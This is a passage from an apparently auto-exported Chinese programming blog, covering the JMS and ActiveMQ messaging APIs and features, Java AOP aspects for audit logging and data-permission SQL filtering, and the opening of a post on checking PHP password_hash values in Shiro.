<h4 id="MessageProducer"><a href="#MessageProducer" class="headerlink" title="MessageProducer"></a>MessageProducer</h4><p>MessageProducer 是一个由 Session创建的对象，用来向 Destination发送消息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MessageProducer createProducer(Destination destination);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MessageProducer producer = session.createProducer(destination);</span><br></pre></td></tr></table></figure>
<p>发送消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void send(Destination destination, Message message);</span><br><span class="line">void send(Destination destination, Message message, int deliveryMode, int priority,long timeToLive);</span><br><span class="line">void send(Message message);</span><br><span class="line">void send(Message message, int deliveryMode, int priority, long timeToLive);</span><br></pre></td></tr></table></figure>
<p>其中 deliveryMode 为传送模式，priority 为消息优先级，timeToLive 为消息过期时间。</p>
<h4 id="MessageConsumer"><a href="#MessageConsumer" class="headerlink" title="MessageConsumer"></a>MessageConsumer</h4><p>MessageConsumer 是一个由 Session创建的对象，用来从 Destination接收消息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MessageConsumer createConsumer(Destination destination);</span><br><span class="line">MessageConsumer createConsumer(Destination destination, String messageSelector);</span><br><span class="line">MessageConsumer createConsumer(Destination destination, String messageSelector, boolean noLocal);</span><br><span class="line">TopicSubscriber createDurableSubscriber(Topic topic, String name);</span><br><span class="line">TopicSubscriber createDurableSubscriber(Topic topic, String name, String</span><br><span class="line"> messageSelector, boolean noLocal);</span><br></pre></td></tr></table></figure>
<p>其中 messageSelector 为消息选择器；noLocal 标志默认为 false，当设置为true时限制消费者只能接收和自己相同的连接（Connection）所发布的消息，此标志只适用于主题，不适用于队列；name标识订阅主题所对应的订阅名称，持久订阅时需要设置此参数。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MessageConsumer consumer = session.createConsumer(destination);</span><br></pre></td></tr></table></figure>

<h4 id="消息的同步和异步接收"><a href="#消息的同步和异步接收" class="headerlink" title="消息的同步和异步接收"></a>消息的同步和异步接收</h4><p>消息的同步接收是指客户端主动去接收消息，客户端可以采用MessageConsumer的 receive 方法去接收下一个消息。</p>
<p>消息的异步接收是指当消息到达时，ActiveMQ 主动通知客户端。客户端可以通过注册一个实现 MessageListener 接口的对象到MessageConsumer。MessageListener只有一个必须实现的方法 —— onMessage，它只接收一个参数，即 Message。在为每个发送到 Destination 的消息实现 onMessage时，将调用该方法。</p>
<p>Message receive()<br>Message receive(long timeout)<br>Message receiveNoWait()</p>
<p>其中 timeout 为等待时间，单位为毫秒。</p>
<p>或者实现 MessageListener 接口，每当消息到达时，ActiveMQ 会调用 MessageListener中的 onMessage 函数。</p>
<h4 id="消息选择器"><a href="#消息选择器" class="headerlink" title="消息选择器"></a>消息选择器</h4><p>JMS 提供了一种机制，使用它，消息服务可根据消息选择器中的标准来执行消息过滤。生产者可在消息中放入应用程序特有的属性，而消费者可使用基于这些属性的选择标准来表明对消息是否感兴趣。这就简化了客户端的工作，并避免了向不需要这些消息的消费者传送消息的开销。然而，它也使得处理选择标准的消息服务增加了一些额外开销。</p>
<p>消息选择器是用于MessageConsumer的过滤器，可以用来过滤传入消息的属性和消息头部分（但不过滤消息体），并确定是否将实际消费该消息。按照 JMS 文档的说法，消息选择器是一些字符串，它们基于某种语法，而这种语法是SQL-92的子集。可以将消息选择器作为MessageConsumer 创建的一部分。</p>
<h4 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h4><p>JMS 程序的最终目的是生产和消费的消息能被其他程序使用，JMS的 Message是一个既简单又不乏灵活性的基本格式，允许创建不同平台上符合非 JMS 程序格式的消息。Message 由以下几部分组成：消息头，属性和消息体。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BlobMessage createBlobMessage(File file)</span><br><span class="line">BlobMessage createBlobMessage(InputStream in)</span><br><span class="line">BlobMessage createBlobMessage(URL url)</span><br><span class="line">BlobMessage createBlobMessage(URL url, boolean deletedByBroker)</span><br><span class="line">BytesMessage createBytesMessage()</span><br><span class="line">MapMessage createMapMessage()</span><br><span class="line">Message createMessage()</span><br><span class="line">ObjectMessage createObjectMessage()</span><br><span class="line">ObjectMessage createObjectMessage(Serializable object)</span><br><span class="line">TextMessage createTextMessage()</span><br><span class="line">TextMessage createTextMessage(String text)</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p>下例演示创建并发送一个 TextMessage到一个队列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TextMessage message = queueSession.createTextMessage();</span><br><span class="line">message.setText(msg_text); // msg_text is a String</span><br><span class="line">queueSender.send(message);</span><br></pre></td></tr></table></figure>
<p>下例演示接收消息并转换为合适的消息类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Message m = queueReceiver.receive();</span><br><span class="line">if (m instanceof TextMessage) &#123;</span><br><span class="line"> TextMessage message = (TextMessage) m;</span><br><span class="line"> System.out.println(&quot;Reading message: &quot; + message.getText());</span><br><span class="line">&#125; else &#123;</span><br><span class="line"> // Handle error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>消息队列</category>
        <category>JMS</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>【JMS】JMS概述</title>
    <url>/blog/arch/jms/jms/</url>
    <content><![CDATA[<p>当前，CORBA、DCOM、RMI等RPC中间件技术已广泛应用于各个领域。但是面对规模和复杂度都越来越高的分布式系统，这些技术也显示出其局限性：</p>
<p>（1）同步通信：客户发出调用后，必须等待服务对象完成处理并返回结果后才能继续执行；<br>（2）客户和服务对象的生命周期紧密耦合：客户进程和服务对象进程 都必须正常运行；如果由于服务对象崩溃或者网络故障导致客户的请求不可达，客户会接收到异常；<br>（3）点对点通信：客户的一次调用只发送给某个单独的目标对象。</p>
<p>面向消息的中间件（Message Oriented Middleware，MOM）较好的解决了以上问题。发送者将消息发送给消息服务器，消息服务器将消息存放在若干队列中，在合适的时候再将消息转发给接收者。</p>
<p>这种模式下， 发送和接收是异步的， 发送者无需等待；二者的生命周期未必相同：发送消息的时候接收者不一定运行，接收消息的时候发送者也不一定运行； 一对多通信：对于一个消息可以有多个接收者。</p>
<p>已有的 MOM 系统包括IBM 的MQSeries、Microsoft 的 MSMQ和BEA 的 MessageQ等。由于没有一个通用的标准，这些系统很难实现互操作和无缝连接。</p>
<h3 id="JMS"><a href="#JMS" class="headerlink" title="JMS"></a>JMS</h3><p>[Java Message Service（JMS）]是 SUN 提出的旨在统一各种 MOM 系统接口的规范，它包含点对点（Point to Point，PTP）和发布&#x2F;订阅（Publish&#x2F;Subscribe，pub&#x2F;sub）两种消息模型，提供可靠消息传输、事务和消息过滤等机制。</p>
<h3 id="JMS规范"><a href="#JMS规范" class="headerlink" title="JMS规范"></a>JMS规范</h3><p>JAVA 消息服务(JMS)定义了 Java 中访问消息中间件的接口。JMS 只是接口，并没有给予实现，实现 JMS 接口的消息中间件称为 JMS Provider，例如 ActiveMQ。</p>
<h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><ol>
<li>JMS Provider：实现 JMS 接口的消息中间件；</li>
<li>PTP：Point to Point，即点对点的消息模型；</li>
<li>Pub&#x2F;Sub：Publish&#x2F;Subscribe，即发布&#x2F;订阅的消息模型；</li>
<li>Queue：队列目标；</li>
<li>Topic：主题目标；</li>
<li>ConnectionFactory：连接工厂，JMS 用它创建连接；</li>
<li>Connection：JMS 客户端到 JMS Provider 的连接；</li>
<li>Destination：消息的目的地；</li>
<li>Session：会话，一个发送或接收消息的线程； MessageProducer：由 Session 对象创建的用来发送消息的对象；</li>
<li>MessageConsumer：由 Session 对象创建的用来接收消息的对象;</li>
<li>Acknowledge：签收；</li>
<li>Transaction：事务。</li>
</ol>
<h3 id="JMS-编程模型"><a href="#JMS-编程模型" class="headerlink" title="JMS 编程模型"></a>JMS 编程模型</h3><p>在JMS编程模型中， JMS客户端（组件或应用程序） 通过JMS消息服务交换消息。消息生产者将消息发送至消息服务，消息消费者则从消息服务接收这些消息。这些消息传送操作是使用一组实现 JMS 应用编程接口 (API) 的对象（由 JMS Provide 提供）来执行的。</p>
<p>在JMS编程模型中，JMS客户端使用 <code>ConnectionFactory</code> 对象创建一个连接，向消息服务发送消息以及从消息服务接收消息均是通过此连接来进行。Connection 是客户端与消息服务的活动连接。创建连接时，将分配通信资源以及验证客户端。这是一个相当重要的对象，大多数客户端均使用一个连接来进行所有的消息传送。</p>
<p>连接用于创建会话。<code>Session</code> 是一个用于生成和使用消息的单线程上下文。它用于创建发送的生产者和接收消息的消费者，并为所发送的消息定义发送顺序。会话通过大量确认选项或通过事务来支持可靠传送。</p>
<p>客户端使用 <code>MessageProducer</code> 向指定的物理目标（在 API 中表示为目标身份对象）发送消息。生产者可指定一个默认传送模式（持久性消息与非持久性消息）、优先级和有效期值，以控制生产者向物理目标发送的所有消息。</p>
<p>同样，客户端使用 <code>MessageConsumer</code> 对象从指定的物理目标（在 API 中表示为目标对象）接收消息。消费者可使用消息选择器，借助它，消息服务可以只向消费者发送与选择标准匹配的那些消息。</p>
<p>消费者可以支持同步或异步消息接收。异步使用可通过向消费者注册 <code>MessageListener</code> 来实现。当会话线程调用 <code>MessageListener</code> 对象的 <code>onMessage</code> 方法时，客户端将使用消息。</p>
<h3 id="JMS-编程域"><a href="#JMS-编程域" class="headerlink" title="JMS 编程域"></a>JMS 编程域</h3><p>JMS 支持两种截然不同的消息传送模型：PTP（即点对点模型）和Pub&#x2F;Sub（即发布&#x2F;订阅模型），分别称作：PTP Domain 和Pub&#x2F;Sub Domain。</p>
<p>PTP（使用Queue即队列目标）消息从一个生产者传送至一个消费者。在此传送模型中，目标是一个队列。消息首先被传送至队列目标，然后根据队列传送策略，从该队列将消息传送至向此队列进行注册的某一个消费者，一次只传送一条消息。可以向队列目标发送消息的生产者的数量没有限制，但每条消息只能发送至、并由一个消费者成功使用。如果没有已经向队列目标注册的消费者，队列将保留它收到的消息，并在某个消费者向该队列进行注册时将消息传送给该消费者。</p>
<p>Pub&#x2F;Sub（使用 Topic即主题目标）消息从一个生产者传送至任意数量的消费者。在此传送模型中，目标是一个主题。消息首先被传送至主题目标，然后传送至所有已订阅此主题的活动消费者。可以向主题目标发送消息的生产者的数量没有限制，并且每个消息可以发送至任意数量的订阅消费者。主题目标也支持持久订阅的概念。持久订阅表示消费者已向主题目标进行注册，但在消息传送时此消费者可以处于非活动状态。当此消费者再次处于活动状态时，它将接收此信息。如果没有已经向主题目标注册的消费者，主题不保留其接收到的消息，除非有非活动消费者注册了持久订阅。</p>
<p>简单说就是，同一目标可以有多个生产者，也可以有多个消息者。一个消息，PTP模式被一个消费都消费之后目标会删除消息，其它消费者就消费不到了；PS模式一个消息被消费后不会消失，其它消息者还可以消费。</p>
<h3 id="开发-JSM-的步骤"><a href="#开发-JSM-的步骤" class="headerlink" title="开发 JSM 的步骤"></a>开发 JSM 的步骤</h3><p>广义上说，一个 JMS 应用是几个JMS 客户端交换消息，开发 JMS 客户端应用由以<br>下几步构成：</p>
<ol>
<li>得到 ConnectionFactory 对象；</li>
<li>用 ConnectionFactory 创建 Connection 对象；</li>
<li>用 Connection 对象创建一个或多个JMS Session；</li>
<li>得到目标队列或主题对象，即Destination 对象；</li>
<li>用 Session 和 Destination 创建MessageProducer 和 MessageConsumer；</li>
<li>通知 Connection 开始传送消息。</li>
</ol>
<h3 id="JMS支持并发"><a href="#JMS支持并发" class="headerlink" title="JMS支持并发"></a>JMS支持并发</h3><p>JMS对象并不是所有对象都支持并发。</p>
<p>支持并发：Destination、ConnectionFactory、Connection</p>
<p>不支持并发：Session、MessageProducer、MessageConsumer</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>消息队列</category>
        <category>JMS</category>
      </categories>
      <tags>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>【JMS】ActiveMQ高级特性</title>
    <url>/blog/arch/jms/activemqsenior/</url>
    <content><![CDATA[<h3 id="异步发送消息"><a href="#异步发送消息" class="headerlink" title="异步发送消息"></a>异步发送消息</h3><p>ActiveMQ支持生产者以同步或异步模式发送消息。使用不同的模式对 send方法的反应时间有巨大的影响，反映时间是衡量ActiveMQ 吞吐量的重要因素，使用异步发送可以提高系统的性能。</p>
<p>在默认大多数情况下，AcitveMQ是以异步模式发送消息。例外的情况：在没有使用事务的情况下，生产者以 PERSISTENT传送模式发送消息。在这种情况下，send方法都是同步的，并且一直阻塞直到 ActiveMQ发回确认消息：消息已经存储在持久性数据存储中。这种确认机制保证消息不会丢失，但会造成生产者阻塞从而影响反应时间。</p>
<p>高性能的程序一般都能容忍在故障情况下丢失少量数据。如果编写这样的程序，可以通过使用异步发送来提高吞吐量（甚至在使用PERSISTENT 传送模式的情况下）。</p>
<p>使用 Connection URI 配置异步发送:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cf = new ActiveMQConnectionFactory(&quot;tcp://locahost:61616?jms.useAsyncSend=true&quot;);</span><br></pre></td></tr></table></figure>
<p>在 ConnectionFactory 层面配置异步发送:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((ActiveMQConnectionFactory)connectionFactory).setUseAsyncSend(true);</span><br></pre></td></tr></table></figure>
<p>在 Connection 层面配置异步发送，此层面的设置将覆盖ConnectionFactory层面的设置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((ActiveMQConnection)connection).setUseAsyncSend(true);</span><br></pre></td></tr></table></figure>
<h3 id="消费者特色"><a href="#消费者特色" class="headerlink" title="消费者特色"></a>消费者特色</h3><h4 id="消费者异步分派"><a href="#消费者异步分派" class="headerlink" title="消费者异步分派"></a>消费者异步分派</h4><p>在 ActiveMQ4 中，支持 ActiveMQ 以同步或异步模式向消费者分派消息。这样的意义：可以以异步模式向处理消息慢的消费者分配消息；以同步模式向处理消息快的消费者分配消息。</p>
<p>ActiveMQ默认以同步模式分派消息，这样的设置可以提高性能。但是对于处理消息慢的消费者，需要以异步模式分派。</p>
<p>在 ConnectionFactory 层面配置同步分派:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((ActiveMQConnectionFactory)connectionFactory).setDispatchAsync(false);</span><br></pre></td></tr></table></figure>
<p>在 Connection 层面配置同步分派，此层面的设置将覆盖ConnectionFactory层面的设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((ActiveMQConnection)connection).setDispatchAsync(false);</span><br></pre></td></tr></table></figure>

<p>在消费者层面以 Destination URI配置同步分派，此层面的设置将覆盖ConnectionFactory 和 Connection 层面的设置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue = new ActiveMQQueue(&quot;TEST.QUEUE?consumer.dispatchAsync=false&quot;);</span><br><span class="line">consumer = session.createConsumer(queue);</span><br></pre></td></tr></table></figure>

<h4 id="消费者优先级"><a href="#消费者优先级" class="headerlink" title="消费者优先级"></a>消费者优先级</h4><p>在 ActveMQ 分布式环境中，在有消费者存在的情况下，如果更希望ActveMQ 发送消息给消费者而不是其他的 ActveMQ 到ActveMQ 的传送，可以如下设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue = new ActiveMQQueue(&quot;TEST.QUEUE?consumer.prority=10&quot;);</span><br><span class="line">consumer = session.createConsumer(queue);</span><br></pre></td></tr></table></figure>

<h4 id="独占的消费者"><a href="#独占的消费者" class="headerlink" title="独占的消费者"></a>独占的消费者</h4><p>ActiveMQ维护队列消息的顺序并顺序把消息分派给消费者。但是如果建立了多个Session 和 MessageConsumer，那么同一时刻多个线程同时从一个队列中接收消息时就并不能保证处理时有序。</p>
<p>有时候有序处理消息是非常重要的。ActiveMQ4 支持独占的消费。ActiveMQ 挑选一个MessageConsumer， 并把一个队列中所有消息按顺序分派给它。 如果消费者发生故障，那么 ActiveMQ 将自动故障转移并选择另一个消费者。可以如下设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue = new ActiveMQQueue(&quot;TEST.QUEUE?consumer.exclusive=true&quot;);</span><br><span class="line">consumer = session.createConsumer(queue);</span><br></pre></td></tr></table></figure>

<h4 id="再次传送策略"><a href="#再次传送策略" class="headerlink" title="再次传送策略"></a>再次传送策略</h4><p>在以下三种情况中，消息会被再次传送给消费者：</p>
<p>1．在使用事务的 Session 中，调用 rollback()方法；<br>2．在使用事务的 Session 中，调用 commit()方法之前就关闭了 Session;<br>3．在 Session中使用 CLIENT_ACKNOWLEDGE 签收模式，并且调用了 recover()方法。</p>
<p>可以通过设置 ActiveMQConnectionFactory和 ActiveMQConnection 来定制想要的再次传送策略。</p>
<h3 id="目标特色"><a href="#目标特色" class="headerlink" title="目标特色"></a>目标特色</h3><h4 id="复合目标"><a href="#复合目标" class="headerlink" title="复合目标"></a>复合目标</h4><p>在 1.1 版本之后，ActiveMQ支持混合目标技术。它允许在一个 JMS 目标中使用一组JMS 目标。</p>
<p>例如可以利用混合目标在同一操作中用向 12 个队列发送同一条消息或者在同一操作中向一个主题和一个队列发送同一条消息。</p>
<p>在混合目标中，通过“,”来分隔不同的目标。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// send to 3 queues as one logical operation</span><br><span class="line">Queue queue = new ActiveMQQueue(&quot;FOO.A,FOO.B,FOO.C&quot;);</span><br><span class="line">producer.send(queue, someMessage);</span><br></pre></td></tr></table></figure>
<p>如果在一个目标中混合不同类别的目标， 可以通过使用 “queue:&#x2F;&#x2F;” 和 “topic:&#x2F;&#x2F;”<br>前缀来识别不同的目标。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// send to queues and topic one logical operation</span><br><span class="line">Queue queue = new ActiveMQQueue(&quot;FOO.A,topic://NOTIFY.FOO.A&quot;);</span><br><span class="line">producer.send(queue, someMessage);</span><br></pre></td></tr></table></figure>
<h4 id="消息预取"><a href="#消息预取" class="headerlink" title="消息预取"></a>消息预取</h4><p>ActiveMQ的目标之一就是高性能的数据传送，所以 ActiveMQ 使用“预取限制”来控制有多少消息能及时的传送给任何地方的消费者。</p>
<p>一旦预取数量达到限制，那么就不会有消息被分派给这个消费者直到它发回签收消息（用来标识所有的消息已经被处理）。</p>
<p>可以为每个消费者指定消息预取。如果有大量的消息并且希望更高的性能，那么可以为这个消费者增大预取值。如果有少量的消息并且每条消息的处理都要花费很长的时间，那么可以设置预取值为 1，这样同一时间，ActiveMQ 只会为这个消费者分派一条消息。</p>
<p>在 ConnectionFactory 层面为所有消费者配置预取值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp://localhost:61616?jms.prefetchPolicy.all=50</span><br></pre></td></tr></table></figure>
<p>在 ConnectionFactory 层面为队列消费者配置预取值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp://localhost:61616?jms.prefetchPolicy.queuePrefetch=1</span><br></pre></td></tr></table></figure>
<p>使用“目标选项”为一个消费者配置预取值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue = new ActiveMQQueue(&quot;TEST.QUEUE?consumer.prefetchSize=10&quot;);</span><br><span class="line">consumer = session.createConsumer(queue);</span><br></pre></td></tr></table></figure>

<h4 id="配置连接URL"><a href="#配置连接URL" class="headerlink" title="配置连接URL"></a>配置连接URL</h4><p>ActiveMQ支持通过 Configuration URI 明确的配置连接属性。</p>
<p>例如：当要设置异步发送时，可以通过在Configuration URI 中使用jms.$PROPER<br>TY 来设置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp://localhost:61616?jms.useAsyncSend=true</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>消息队列</category>
        <category>JMS</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>【组件】如何用AOP实现功能审计</title>
    <url>/blog/arch/component/aopaudit/</url>
    <content><![CDATA[<p>审计一般要记录用户访问了哪个功能，参数是什么，用于找出用户干了什么事。</p>
<p>今天看了一个比较好的方法，用JAVA注解和AOP实现审计功能。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>在要审计的方法上加上JAVA注解SysLog</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SysLog(&quot;新增系统用户&quot;)</span><br><span class="line">public Result save(@RequestBody UserEntity user)&#123;</span><br><span class="line">	userService.save(user);</span><br><span class="line">	return Result.ok();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注解SysLog"><a href="#注解SysLog" class="headerlink" title="注解SysLog"></a>注解SysLog</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Target(ElementType.METHOD)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Documented</span><br><span class="line">public @interface SysLog &#123;</span><br><span class="line"></span><br><span class="line">	String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关键的AOP实现"><a href="#关键的AOP实现" class="headerlink" title="关键的AOP实现"></a>关键的AOP实现</h3><p>把切入各项要记录的信息收集到，插入数据库，为了效率也可以异步放入MQ慢慢处理，都可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Aspect</span><br><span class="line">@Component</span><br><span class="line">public class SysLogAspect &#123;</span><br><span class="line">	@Autowired</span><br><span class="line">	private SysLogService sysLogService;</span><br><span class="line">	</span><br><span class="line">	@Pointcut(&quot;@annotation(com.xxxxxx.SysLog)&quot;)</span><br><span class="line">	public void logPointCut() &#123; </span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	@Before(&quot;logPointCut()&quot;)</span><br><span class="line">	public void saveSysLog(JoinPoint joinPoint) &#123;</span><br><span class="line">		MethodSignature signature = (MethodSignature) joinPoint.getSignature();</span><br><span class="line">		Method method = signature.getMethod();</span><br><span class="line">		</span><br><span class="line">		SysLogEntity sysLog = new SysLogEntity();</span><br><span class="line">		SysLog syslog = method.getAnnotation(SysLog.class);</span><br><span class="line">		if(syslog != null)&#123;</span><br><span class="line">			//注解上的描述 </span><br><span class="line">			sysLog.setOperation(syslog.value());</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		//请求的方法名</span><br><span class="line">		String className = joinPoint.getTarget().getClass().getName();</span><br><span class="line">		String methodName = signature.getName();</span><br><span class="line">		sysLog.setMethod(className + &quot;.&quot; + methodName + &quot;()&quot;);</span><br><span class="line">		</span><br><span class="line">		//请求的参数</span><br><span class="line">		Object[] args = joinPoint.getArgs();</span><br><span class="line">		if(args.length&gt;0)&#123;</span><br><span class="line">			String params = JSON.toJSONString(args[0]);</span><br><span class="line">			sysLog.setParams(params);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//获取request</span><br><span class="line">		HttpServletRequest request = HttpContextUtils.getHttpServletRequest();</span><br><span class="line">		//设置IP地址</span><br><span class="line">		sysLog.setIp(IPUtils.getIpAddr(request));</span><br><span class="line">		</span><br><span class="line">		//用户名</span><br><span class="line">		String username = ShiroUtils.getUserEntity().getUserName();</span><br><span class="line"></span><br><span class="line">		sysLog.setUsername(username);</span><br><span class="line">		</span><br><span class="line">		sysLog.setCreateDate(new Date());</span><br><span class="line">		//保存系统日志</span><br><span class="line">		sysLogService.save(sysLog);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>组件</category>
      </categories>
      <tags>
        <tag>AOP</tag>
        <tag>审计</tag>
      </tags>
  </entry>
  <entry>
    <title>【权限】如何用AOP实现数据权限功能</title>
    <url>/blog/arch/component/dataauth/</url>
    <content><![CDATA[<p>针对不同用户，在数据查询时要在SQL上拼上可以访问的部门机构部分。</p>
<p>这部分数据查询权限一般都是按一定配制或规则制定的。</p>
<p>这里看到一种比较好的方法可以实现数据权限。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>其中tableAlias为SQL中表的别名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@DataAuth(tableAlias = &quot;s&quot;)</span><br><span class="line">public Result list(@RequestParam Map&lt;String, Object&gt; params)&#123;</span><br><span class="line">	//查询列表数据</span><br><span class="line">       Query query = new Query(params);</span><br><span class="line"></span><br><span class="line">	List&lt;UserEntity&gt; userList = userService.queryList(query);</span><br><span class="line">	int total = userService.queryTotal(query);</span><br><span class="line">	</span><br><span class="line">	PageUtils pageUtil = new PageUtils(userList, total, query.getLimit(), query.getPage());</span><br><span class="line">	</span><br><span class="line">	return Result.ok().put(&quot;page&quot;, pageUtil);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关键的AOP方法"><a href="#关键的AOP方法" class="headerlink" title="关键的AOP方法"></a>关键的AOP方法</h3><p>核心思想就是查询参数是一个MAP，在MAP中加入dataAuthSql参数，dataAuthSql是通过用户配制信息生成的一个SQL片段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Aspect</span><br><span class="line">@Component</span><br><span class="line">public class DataAuthAspect &#123;</span><br><span class="line">    @Pointcut(&quot;@annotation(com.hxy.modules.common.annotation.DataAuth)&quot;)</span><br><span class="line">    public void dataAuthPointcut()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Before(&quot;dataAuthPointcut()&quot;)</span><br><span class="line">    public void dataAuth(JoinPoint joinPoint) throws Throwable&#123;</span><br><span class="line">        //获取方面第一个参数</span><br><span class="line">        Object params = joinPoint.getArgs()[0];</span><br><span class="line">        //如果参数为Map类型</span><br><span class="line">        if(params != null &amp;&amp; params instanceof Map)&#123;</span><br><span class="line">            String currentUserId = UserUtils.getCurrentUserId();</span><br><span class="line">            //如果当前用户不为超级管理员，则需要进行数据过滤</span><br><span class="line">            if(!currentUserId.equals(Constant.SUPERR_USER))&#123;</span><br><span class="line">                ((Map) params).put(&quot;dataAuthSql&quot;,dataAuthSql(joinPoint));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            throw new MyException(&quot;需要数据权限过滤，需要查询方法的第一个参数为Map类型，且不能为NULL&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String dataAuthSql(JoinPoint joinPoint)&#123;</span><br><span class="line">        //获取目标方法签名</span><br><span class="line">        MethodSignature signature = (MethodSignature) joinPoint.getSignature();</span><br><span class="line">        //通过方法签名，获取数据过滤注解</span><br><span class="line">        DataAuth annotation = signature.getMethod().getAnnotation(DataAuth.class);</span><br><span class="line">        //通过注解获取别名</span><br><span class="line">        String tableAlias = annotation.tableAlias();</span><br><span class="line">        if(!StringUtils.isEmpty(tableAlias))&#123;</span><br><span class="line">            tableAlias+=&quot;.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder dataAuthSql = new StringBuilder();</span><br><span class="line">        dataAuthSql.append(&quot; AND (&quot;);</span><br><span class="line"></span><br><span class="line">        //获取用户授权部门</span><br><span class="line">        String baids = UserUtils.getDateAuth(Constant.DataAuth.BA_DATA.getValue());</span><br><span class="line">        //获取用户授权机构</span><br><span class="line">        String bapids = UserUtils.getDateAuth(Constant.DataAuth.BAP_DATA.getValue());</span><br><span class="line">        dataAuthSql.append(tableAlias);</span><br><span class="line">        dataAuthSql.append(&quot;create_id = &quot;);</span><br><span class="line">        dataAuthSql.append(&quot;&#x27;&quot; + UserUtils.getCurrentUserId() + &quot;&#x27;&quot;);</span><br><span class="line">        if(baids != null &amp;&amp; !StringUtils.isEmpty(baids))&#123;</span><br><span class="line">            dataAuthSql.append(&quot;OR &quot;);</span><br><span class="line">            dataAuthSql.append(tableAlias);</span><br><span class="line">            dataAuthSql.append(&quot;baid IN(&quot;);</span><br><span class="line">            dataAuthSql.append(baids);</span><br><span class="line">            dataAuthSql.append(&quot;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(bapids != null &amp;&amp; !StringUtils.isEmpty(bapids))&#123;</span><br><span class="line">            dataAuthSql.append(&quot;OR &quot;);</span><br><span class="line">            dataAuthSql.append(tableAlias);</span><br><span class="line">            dataAuthSql.append(&quot;bapid IN(&quot;);</span><br><span class="line">            dataAuthSql.append(bapids);</span><br><span class="line">            dataAuthSql.append(&quot;)&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        dataAuthSql.append(&quot;)&quot;);</span><br><span class="line">        return dataAuthSql.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>组件</category>
      </categories>
      <tags>
        <tag>AOP</tag>
        <tag>数据权限</tag>
      </tags>
  </entry>
  <entry>
    <title>【组件】Shiro设置PHP的password_hash验证</title>
    <url>/blog/arch/component/shriophp/</url>
    <content><![CDATA[<p>今天处理了个登录问题，有个PHP生成的用户数据，要用JAVA项目去登录，JAVA用的是shiro做的权限。</p>
<p>看了下PHP是用<code>password_hash()</code>做的密码hash和验证，这个java里没有找到合适的组件集成。</p>
<h2 id="BCrypt类库"><a href="#BCrypt类库" class="headerlink" title="BCrypt类库"></a>BCrypt类库</h2><p>这里找了个替代组件<a href="https://github.com/patrickfav/bcrypt">BCrypt类库</a>：</p>
